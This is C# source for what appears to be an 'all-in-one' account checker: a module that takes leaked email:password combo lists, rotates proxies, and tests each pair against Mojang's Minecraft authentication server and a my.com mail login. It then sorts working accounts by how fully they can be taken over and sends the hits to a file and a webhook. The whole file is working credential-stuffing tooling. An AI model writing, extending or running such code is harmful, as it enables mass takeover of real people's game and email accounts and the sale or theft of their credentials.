using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace Bolt_AIO
{
    internal class Minecraftmod
    {
        private static readonly Uri SFACheckUri = new Uri("https://api.mojang.com/user/security/challenges");

        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            var capture = new StringBuilder();

                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent =
                                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = false;
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var text2 = req.Post("https://authserver.mojang.com/authenticate",
                                    "{\"agent\": {\"name\": \"Minecraft\",\"version\": 1},\"username\": \"" + array[0] +
                                    "\",\"password\": \"" + array[1] + "\",\"requestUser\": \"true\"}",
                                    "application/json")
                                .ToString();

                            if (text2.Contains("selectedProfile"))
                            {
                                var jsonObj = (JObject) JsonConvert.DeserializeObject(text2);

                                var username = (string) jsonObj["selectedProfile"]["name"];
                                var token = (string) jsonObj["accessToken"];

                                var type = "NFA";

                                if (MailAccessCheck(array[0], array[1]) == "Working")
                                    type = "MFA";
                                else if (SFACheck(token)) type = "SFA";

                                Program.Hits++;
                                Program.TotalChecks++;
                                Export.AsResult("/Minecraft_hits",
                                    array[0] + ":" + array[1] + $" | {type} - Username: {username}");
                                if (Program.lorc == "LOG")
                                    Settings.PrintHit("McAfee",
                                        array[0] + ":" + array[1] + $" | {type} - Username: {username}");
                                if (Settings.sendToWebhook)
                                    Settings.sendTowebhook1(
                                        array[0] + ":" + array[1] + $" | {type} - Username: {username}",
                                        "Minecraft Hits");
                            }
                            else
                            {
                                var flag8 = text2.Contains(
                                    "{\"error\":\"ForbiddenOperationException\",\"errorMessage\":\"Invalid credentials. Invalid username or password.\"}");
                                if (flag8)
                                {
                                    Program.Fails++;
                                    Program.TotalChecks++;
                                }
                                else if (text2.Contains(
                                    "{\"error\":\"JsonParseException\",\"errorMessage\":\"Unexpected character "))
                                {
                                    Program.Fails++;
                                    Program.TotalChecks++;
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        public static bool SFACheck(string token)
        {
            while (true)
                try
                {
                    using (var req = new HttpRequest())
                    {
                        switch (Program.ProxyType1)
                        {
                            case "HTTP":
                                req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS4":
                                req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS5":
                                req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                        }

                        req.AddHeader("Authorization", "Bearer " + token);
                        var response = req.Get(SFACheckUri).ToString();

                        if (response == "[]")
                            return true;
                        break;
                    }
                }
                catch
                {
                    Program.Errors++;
                }

            return false;
        }

        private static string MailAccessCheck(string email, string password)
        {
            while (true)
                try
                {
                    using (var req = new HttpRequest())
                    {
                        switch (Program.ProxyType1)
                        {
                            case "HTTP":
                                req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS4":
                                req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS5":
                                req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                        }

                        req.UserAgent = "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0";

                        var strResponse = req.Get(new Uri(
                                $"https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login={email}&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=en_FR&Password={password}&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&"))
                            .ToString();

                        if (strResponse.Contains("Ok=1")) return "Working";
                        break;
                    }
                }
                catch
                {
                    Program.Errors++;
                }

            return "";
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}